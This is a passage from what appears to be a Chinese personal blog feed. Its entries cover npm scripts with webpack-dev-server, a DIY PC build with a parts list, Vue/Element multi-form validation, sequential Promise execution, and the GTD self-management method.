<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cross-env NODE_ENV=development webpack-dev-server --inline --progress  --config build/webpack.dev.conf.js --host 0.0.0.0&quot;</span></span><br><span class="line">    ...</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>接着，我们来分析一下上面的 package.json 片段：</p>
<p><code>cross-env NODE_ENV=development webpack-dev-server --inline --progress --config build/webpack.dev.conf.js --host 0.0.0.0</code></p>
<ol>
<li>环境变量 NODE_ENV 赋值为 development，以便运行时的 webpack.dev.conf.js 下，可以通过 process.env.NODE_ENV 访问值</li>
<li>执行 webpack-dev-server 命令，它带有–inline， –progress ， –config ，–host 四个参数，进而执行 build&#x2F;webpack.dev.conf.js</li>
</ol>
<p>使用 cross-env，webpack-dev-server 这 2 个命令，需要提前安装好开发依赖包。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ npm add -D cross-env webpack-dev-server</span><br></pre></td></tr></table></figure>

<p>cross-env 的用法，上文有提到，webpack-dev-server<a href="https://github.com/webpack/webpack-dev-server#readme">官方用法详见</a>。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="http://www.ruanyifeng.com/blog/2016/10/npm_scripts.html">npm scripts 使用指南</a></p>
<p>[2] <a href="http://nodejs.cn/api/debugger.html">node - debugger 调试器</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>npm</tag>
        <tag>node</tag>
        <tag>webpack</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>记录一次DIY电脑的全过程</title>
    <url>/2022/03/05/20220305-%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1DIY%E7%94%B5%E8%84%91%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="硬件准备"><a href="#硬件准备" class="headerlink" title="硬件准备"></a>硬件准备</h2><table>
<thead>
<tr>
<th>序号</th>
<th>硬件</th>
<th>名称</th>
<th>售价</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>CPU</td>
<td>i5-10400(版 U 套装)</td>
<td>1799</td>
</tr>
<tr>
<td>2</td>
<td>主板</td>
<td>微星 B560M WIFI</td>
<td>0</td>
</tr>
<tr>
<td>3</td>
<td>显卡</td>
<td>蓝宝石 RX6500XT 白金版</td>
<td>1899</td>
</tr>
<tr>
<td>4</td>
<td>硬盘</td>
<td>凯侠 RC20 M.2 NVME PCIE3.0 1T</td>
<td>579</td>
</tr>
<tr>
<td>5</td>
<td>内存</td>
<td>威刚 DDR4 3200 2*8G</td>
<td>369</td>
</tr>
<tr>
<td>6</td>
<td>散热器</td>
<td>利民 AS120 刺灵</td>
<td>99</td>
</tr>
<tr>
<td>7</td>
<td>电源</td>
<td>长城 额定 500W HOPE-6000DS(双 8pin)</td>
<td>219</td>
</tr>
<tr>
<td>8</td>
<td>机箱</td>
<td>游戏帝国 寂静岭 隔音</td>
<td>109</td>
</tr>
<tr>
<td>9</td>
<td>显示器</td>
<td>AOC 27 英寸 AH-IPS 广视角 75Hz HDR Mode Type-C 接口 办公节能 低蓝光不闪 旋转升降电脑显示器 I2790PC</td>
<td>1199</td>
</tr>
<tr>
<td>10</td>
<td>键盘</td>
<td>戴尔有线键盘 KB216 黑色</td>
<td>40.92</td>
</tr>
<tr>
<td>11</td>
<td>鼠标</td>
<td>牧马人无线鼠标可充电式 磨砂黑(银侧翼) 无声静音 800 毫安大锂电</td>
<td>29.9</td>
</tr>
<tr>
<td>12</td>
<td>音箱</td>
<td>小度智能音箱 mini 版 随身蓝牙音箱 迷你音响</td>
<td>65</td>
</tr>
</tbody></table>
<blockquote>
<p>tips</p>
<p>盒装 CPU 自带散热器的，对于是否有必要再购买散热器还是散片 CPU + 主板 + 散热器组合，自己权衡抉择。</p>
</blockquote>
<h2 id="组装"><a href="#组装" class="headerlink" title="组装"></a>组装</h2><p>这里，涉及上面硬件准备表格中的 1~8。安装步骤如下：</p>
<ol>
<li>打开主板上的 CPU 插槽，对准<strong>标志小三角</strong>，插入 CPU</li>
<li>主板上找内存插槽，插入内存条</li>
<li>主板上找 M.2 硬盘插槽，安插 M.2 硬盘</li>
<li>CPU 上涂上硅脂，散热器安装，插 CPU 风扇线</li>
<li>拆机箱，安装电源，整理线路</li>
<li>主板装入机箱，插线，先插入机箱上的线（电源跳线，音频线，USB 线），再插入电源上的线（主板供电接口，CPU 供电接口）</li>
<li>安装显卡，再插入显卡供电接口线</li>
</ol>
<blockquote>
<p>! 注意</p>
<ol>
<li>机箱如果带有 RGB 线，直接找到主板上对应的插槽插入即可。</li>
<li>这里没有装固态&#x2F;机械硬盘，所以没提到它怎么插线安装，固态&#x2F;机械硬盘有一个供电接口（接电源）和数据传输接口（接主板），找到对应位置插入即可。</li>
<li>机箱除了一个 CPU 扇热器风扇，没有装其他风扇，所以没有给出机箱风扇怎么插线安装。后续如果有的话，直接主板上找对应位置插入即可。</li>
<li>注意散热器方向，一般跟内存条方向一样，如果只有一个风扇，该风扇需安装到内存条的那一侧。</li>
<li>机箱还是选大一点的，方面接线。另外，看看机箱规格，支持的主板大小，散热器高度，显卡长度等。</li>
</ol>
</blockquote>
<h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="1、微星-B560M-主板上-CPU-供电是-8-4-的插槽，需要插满吗？"><a href="#1、微星-B560M-主板上-CPU-供电是-8-4-的插槽，需要插满吗？" class="headerlink" title="1、微星 B560M 主板上 CPU 供电是 8+4 的插槽，需要插满吗？"></a>1、微星 B560M 主板上 CPU 供电是 8+4 的插槽，需要插满吗？</h3><p>如果 CPU 不是带 K 的或超频老玩家，一般 8pin 供电足够用了。</p>
<h3 id="2、机箱风扇散热方向反了？"><a href="#2、机箱风扇散热方向反了？" class="headerlink" title="2、机箱风扇散热方向反了？"></a>2、机箱风扇散热方向反了？</h3><p>方形风扇，四条边，有一边标有风扇转动方向和出风口方向。散热方向与主板接口方向一致。</p>
<h3 id="3、为什么有的机箱跳线根数不一样？少了-2-个孔的电源重置插头"><a href="#3、为什么有的机箱跳线根数不一样？少了-2-个孔的电源重置插头" class="headerlink" title="3、为什么有的机箱跳线根数不一样？少了 2 个孔的电源重置插头"></a>3、为什么有的机箱跳线根数不一样？少了 2 个孔的电源重置插头</h3><p>没事儿，只管插对的，开机和重启插头不区分正负，其他需要区分，如图所示：</p>
<p><img src="https://cdn.huatree.top/image-20221110215931964.png" alt="image-20221110215931964"></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://www.miaomiaozhe.com/post/240163">学会自己挑选硬件，组装一台电脑</a></p>
<p>[2] <a href="https://www.bilibili.com/video/BV1NJ411B7kb?p=1">【H-WELL 联盟】台式电脑装机教程</a></p>
<p>[3] <a href="https://www.bilibili.com/video/BV1nW411W76t?spm_id_from=333.880.my_history.page.click">主板接线，所有的线</a></p>
<p>[4] <a href="https://www.bilibili.com/video/BV1nt411v79G?spm_id_from=333.337.search-card.all.click">电脑机箱篇-科普机箱尺寸和风道的知识，以后买机箱不会懵逼了</a></p>
]]></content>
      <categories>
        <category>生活滋味</category>
      </categories>
      <tags>
        <tag>电脑DIY</tag>
      </tags>
  </entry>
  <entry>
    <title>vue+element form多表单校验</title>
    <url>/2022/03/14/20220314-vue+element-form%E5%A4%9A%E8%A1%A8%E5%8D%95%E6%A0%A1%E9%AA%8C/</url>
    <content><![CDATA[<p>一般项目中会对 Element Form 表单进行二次封装，封装后的通用表单，有时候不能适用一些特殊的表单，可以用到多表单组合一起验证，待都校验通过后再执行后续动作。</p>
<span id="more"></span>

<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>先对每一个表单进行校验，返回一个 Promise 对象，然后使用<code>Promise.all()</code>方法对所有返回的 Promise 对象判断，全部是 fullfilled 的时候执行后续逻辑。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-form</span> <span class="attr">ref</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">:model</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">:rules</span>=<span class="string">&quot;rules1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">&quot;标题1&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;title1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">&quot;form1.title1&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入标题1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">&quot;内容1&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;content1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">&quot;form1.content1&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入内容1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-form</span> <span class="attr">ref</span>=<span class="string">&quot;form2&quot;</span> <span class="attr">:model</span>=<span class="string">&quot;form2&quot;</span> <span class="attr">:rules</span>=<span class="string">&quot;rules2&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">&quot;标题2&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;title2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">&quot;form2.title2&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入标题2&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">&quot;内容2&quot;</span> <span class="attr">prop</span>=<span class="string">&quot;content2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">&quot;form2.content2&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入内容2&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;onOk&quot;</span>&gt;</span>确定<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>: <span class="string">&#x27;MoreForm&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">form1</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">title1</span>: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">content1</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">form2</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">title2</span>: <span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">content2</span>: <span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">rules1</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">title1</span>: [</span></span><br><span class="line"><span class="language-javascript">            &#123; <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;请输入标题1&#x27;</span>, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">          ],</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">content1</span>: [</span></span><br><span class="line"><span class="language-javascript">              &#123; <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;请输入内容1&#x27;</span>, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">            ]</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">         <span class="attr">rules2</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">title2</span>: [</span></span><br><span class="line"><span class="language-javascript">            &#123; <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;请输入标题2&#x27;</span>, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">          ],</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">content2</span>: [</span></span><br><span class="line"><span class="language-javascript">              &#123; <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;请输入内容2&#x27;</span>, <span class="attr">trigger</span>: <span class="string">&#x27;blur&#x27;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">            ]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">  	<span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">onOk</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> formValidate = [</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">$refs</span>[<span class="string">&#x27;form1&#x27;</span>].<span class="title function_">validate</span>(),</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">this</span>.<span class="property">$refs</span>[<span class="string">&#x27;form2&#x27;</span>].<span class="title function_">validate</span>()</span></span><br><span class="line"><span class="language-javascript">        ]</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Promise</span>.<span class="title function_">all</span>(formValidate).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// todo</span></span></span><br><span class="line"><span class="language-javascript">          <span class="comment">// 校验通过后的处理</span></span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://element.eleme.cn/#/zh-CN/component/form">Element &gt; 组件 &gt; Form 表单</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Element</tag>
      </tags>
  </entry>
  <entry>
    <title>多个Promise顺序执行</title>
    <url>/2022/03/15/20220315-%E5%A4%9A%E4%B8%AAPromise%E9%A1%BA%E5%BA%8F%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>一些复杂的表单提交，会涉及到下个选择框的值来自前几个入参值请求 API 所得（几个入参值是接口返回得出参），这种情况下，就满足多个 Promise 顺序执行。</p>
<span id="more"></span>

<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">f1</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;p1 running&#x27;</span>)</span><br><span class="line">      <span class="title function_">resolve</span>(<span class="number">1</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">f2</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;p2 running&#x27;</span>)</span><br><span class="line">      <span class="title function_">resolve</span>(<span class="number">2</span>)</span><br><span class="line">    &#125;, <span class="number">500</span>)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>

<h3 id="Promise-回调"><a href="#Promise-回调" class="headerlink" title="Promise 回调"></a>Promise 回调</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">f1</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">f2</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="async-函数"><a href="#async-函数" class="headerlink" title="async 函数"></a>async 函数</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!(<span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">asyncPromise</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">f1</span>()</span><br><span class="line">  <span class="title function_">f2</span>()</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [f1, f2]</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">runPromiseInsequence</span> = (<span class="params">array, value</span>) =&gt;</span><br><span class="line">  array.<span class="title function_">reduce</span>(<span class="function">(<span class="params">promiseChain, currentFunction</span>) =&gt;</span> promiseChain.<span class="title function_">then</span>(currentFunction), <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(value))</span><br><span class="line"><span class="title function_">runPromiseInsequence</span>(arr, <span class="string">&#x27;init&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [f1, f2]</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sequencePromise</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> pro = arr.<span class="title function_">shift</span>()</span><br><span class="line">  <span class="keyword">if</span> (pro) &#123;</span><br><span class="line">    <span class="title function_">pro</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">sequencePromise</span>(arr)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">sequencePromise</span>(arr)</span><br></pre></td></tr></table></figure>

<h3 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [f1, f2]</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>()</span><br><span class="line">  arr.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    res = res.<span class="title function_">then</span>(item)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">func</span>(arr)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>Promise</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>GTD自我管理</title>
    <url>/2022/03/16/20220316-GTD%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h2 id="1-GTD-是什么"><a href="#1-GTD-是什么" class="headerlink" title="1 GTD 是什么"></a>1 GTD 是什么</h2><p>GTD 不应该只翻译为“把事情做完”，而是把事情处理完和做好，是有价值的结果，而不是完成的数量。</p>
<p>待办事项混乱，不得不一边思考有哪些事情要做，一边思考如何去做。而 GTD 则是：</p>
<ul>
<li>大脑清空不混乱</li>
<li>明确知道下一步应该做什么</li>
</ul>
<h2 id="2-GTD-流程"><a href="#2-GTD-流程" class="headerlink" title="2 GTD 流程"></a>2 GTD 流程</h2><h3 id="2-1-收集-Collect"><a href="#2-1-收集-Collect" class="headerlink" title="2.1 收集(Collect)"></a>2.1 收集(Collect)</h3><p>捕获(Capture)</p>
<p><strong>收集箱</strong>：收集各种事情</p>
<p>【问题 1】这件事情可以行动吗？</p>
<p>否：</p>
<ul>
<li><strong>参考资料</strong></li>
<li><strong>可能清单</strong></li>
<li><strong>回收箱</strong></li>
</ul>
<p>是：</p>
<p>【问题 2】这件事可以一部搞定吗？</p>
<p>否：<strong>项目清单</strong></p>
<p>是：【问题 3】这件事可以在 2 分钟搞定吗？</p>
<p>能：立即做</p>
<p>不能：【问题 4】这件事该我做吗？</p>
<p>否：<strong>等待清单</strong>(≠ 确认别人完成与否，而是确保任务顺利完成)</p>
<p>是：【问题 5】有特定时间吗？</p>
<p>无：<strong>执行清单</strong>，事情执行归宿（后续项目清单加进来，等待清单加进来，甚至，可能清单也有跟着进来的时候）</p>
<p>有：<strong>日历&#x2F;应用</strong>，根据具体日期完成放入执行清单需要特定时间安排的事情</p>
<h3 id="2-2-整理-Process"><a href="#2-2-整理-Process" class="headerlink" title="2.2 整理(Process)"></a>2.2 整理(Process)</h3><p>明晰(Clarify)</p>
<p>分区：</p>
<ul>
<li>执行清单</li>
<li>等待清单</li>
<li>项目清单</li>
<li>可能清单</li>
<li>参考资料</li>
<li>回收箱</li>
<li>日历&#x2F;应用</li>
</ul>
<blockquote>
<p>! 注意</p>
<p>收集箱：拿出去的事项不能再放回</p>
<p>项目清单：主动拆解项目清单</p>
<p>可能清单：更新等待、可能清单及回收箱</p>
<p>日历&#x2F;应用：确定日期设置恰当</p>
</blockquote>
<h3 id="2-3-组织-Organize"><a href="#2-3-组织-Organize" class="headerlink" title="2.3 组织(Organize)"></a>2.3 组织(Organize)</h3><p>组织(Organize)</p>
<h3 id="2-4-计划-Plan"><a href="#2-4-计划-Plan" class="headerlink" title="2.4 计划(Plan)"></a>2.4 计划(Plan)</h3><p>回顾(Reflect)</p>
<p>项目清单，下一步是什么？做，放到执行清单中，排期（会用到日历&#x2F;应用）。</p>
<h3 id="2-5-执行-Do"><a href="#2-5-执行-Do" class="headerlink" title="2.5 执行(Do)"></a>2.5 执行(Do)</h3><p>执行(Engage)</p>
<p>执行清单的内容做了，拿结果，而不是等结果。</p>
<h2 id="3-执行清单"><a href="#3-执行清单" class="headerlink" title="3 执行清单"></a>3 执行清单</h2><h3 id="3-1-如何给执行清单排序"><a href="#3-1-如何给执行清单排序" class="headerlink" title="3.1 如何给执行清单排序"></a>3.1 如何给执行清单排序</h3><ol>
<li><p>暂时保留意见</p>
<ul>
<li>GTD</li>
<li>要事第一（史蒂芬 · 科维），出自《高效能人士的 7 个习惯》</li>
<li>四象限法则（艾森豪威尔）。<strong>推荐</strong></li>
</ul>
</li>
<li><p>两个基本原则</p>
<ul>
<li>你不可能完成所有的事情</li>
<li>尽可能做离你目标更近的事情</li>
</ul>
</li>
<li><p>GTD（大卫 · 艾伦）</p>
<p>从小处入手，提高效率。</p>
</li>
</ol>
<h3 id="3-2-四个注意事项"><a href="#3-2-四个注意事项" class="headerlink" title="3.2 四个注意事项"></a>3.2 四个注意事项</h3><ol>
<li><p>能够放进执行清单的，都是可以一步搞定的。如果用时较长，就要想一下了：</p>
<ul>
<li>事情本身非常特殊</li>
<li>能力有问题</li>
<li>态度有问题</li>
</ul>
</li>
<li><p>做计划、做方案是每个人的必修课</p>
<ul>
<li>“怎么做”是方法和技巧</li>
<li>“为什么？”、“怎么来的”才和计划、方案有更紧密的联系</li>
</ul>
</li>
<li><p>预估执行清单的各项任务时间</p>
</li>
<li><p>为特别的事件预留时间</p>
<p>需要灵活推进事件的完成度了，万物皆可为己用。</p>
</li>
</ol>
<h3 id="3-3-如何保障执行清单的质量和效率"><a href="#3-3-如何保障执行清单的质量和效率" class="headerlink" title="3.3 如何保障执行清单的质量和效率"></a>3.3 如何保障执行清单的质量和效率</h3><h4 id="3-3-1-一次只处理一件事情"><a href="#3-3-1-一次只处理一件事情" class="headerlink" title="3.3.1 一次只处理一件事情"></a>3.3.1 一次只处理一件事情</h4><p>可以看看《最重要的事只有一件》。一次做好一件事，别被打断，你离成功就更近了。</p>
<h4 id="3-3-2-使用番茄时钟提高效率"><a href="#3-3-2-使用番茄时钟提高效率" class="headerlink" title="3.3.2 使用番茄时钟提高效率"></a>3.3.2 使用番茄时钟提高效率</h4><p>应用软件也可以是 forest，普通厨房计时器等。尽力专注、高效地完成手上的事情。这样做，可能会忽略一些其他事儿，比如电话未接，短信未回等，进而产生负罪感。</p>
<h4 id="3-3-3-打破”负罪感幻觉“"><a href="#3-3-3-打破”负罪感幻觉“" class="headerlink" title="3.3.3 打破”负罪感幻觉“"></a>3.3.3 打破”负罪感幻觉“</h4><p>这里要分清楚 2 个东西：负罪感和负罪感幻觉。</p>
<p>假如朋友突发紧急情况，不得不需要你的帮助，而你不去。当良心过意不去的时候，那种感觉叫<strong>负罪感</strong>。而如果朋友明知你手头上有重要的事情要做，而非要带你来一局游戏，那种害怕拒绝而不被当作朋友的感觉，我把它称为<strong>负罪感幻觉</strong>。类似的幻觉还有：</p>
<ul>
<li>无关紧要的消息，必须秒回</li>
<li>突然交给你的任务，必须马上处理</li>
</ul>
<p>要把执行清单中的事情做的更加的高效，最好打破这种负罪感幻觉。消息可以之后再回，电话可以之后再打；决定可以晚些再做，即便是他人突然交给你的任务，只要不紧急立即处理的。</p>
<p>以上 GTD 的理论在处理过程中，参考资料、回收箱目前是空的。而在现实里，它们当中可能随时都会出现新的内容；同样的，也时刻都在出现新的、需要你去做的事情。</p>
<p>当你意识到这些，那么伴随而来的问题就是：</p>
<ul>
<li>我什么时候收集（捕获）？</li>
<li>什么时候明晰？</li>
<li>什么时候组织？</li>
<li>什么时候回顾？</li>
<li>什么时候执行？</li>
</ul>
<p>如果把一个或多个事项看成主体，我们确实是先把它收集起来；然后看它符合哪个分区，也就是明晰；之后再把它放到对应的分区，也就是组织；问自己下一步行动是什么，也就是回顾；再然后执行。刚好就是 GTD 的五个步骤。</p>
<p>也正是因为这五个步骤是以事项为主体，所以不管你在哪里看到 GTD 的介绍、教程，仍然会对什么时候做什么，感到迷茫。</p>
<p>为什么呢？因为时间管理、任务管理的主体是人，是你自己，而不是一件一件的事项！</p>
<p>所以，下面给出 GTD 的表格，使你念头通达。</p>
<table>
<thead>
<tr>
<th>步骤</th>
<th>捕获</th>
<th>明晰</th>
<th>组织</th>
<th>回顾</th>
<th>执行</th>
</tr>
</thead>
<tbody><tr>
<td>事项收集</td>
<td>① 全部放到收集箱</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>每日回顾</td>
<td></td>
<td>③ 这些事该放进哪个区</td>
<td>④ 放进相应的分区</td>
<td>① 收集箱清空没？⑤ 收集箱够没？<br />⑥ 等待清单下一步？在做吗？如何了？<br />⑦ 项目清单下一步？在做吗？如何了？<br />⑧ 可能清单下一步？在做吗？如何了？</td>
<td>② 两分钟可以执行吗？做！</td>
</tr>
<tr>
<td>事项处理</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>① 日历中的事项按日期处理<br />② 按照排序处理执行清单中的事项</td>
</tr>
<tr>
<td>每周回顾</td>
<td></td>
<td></td>
<td></td>
<td>① 查漏补缺，以保万无一失<br />② 相比被动收集，更加主动</td>
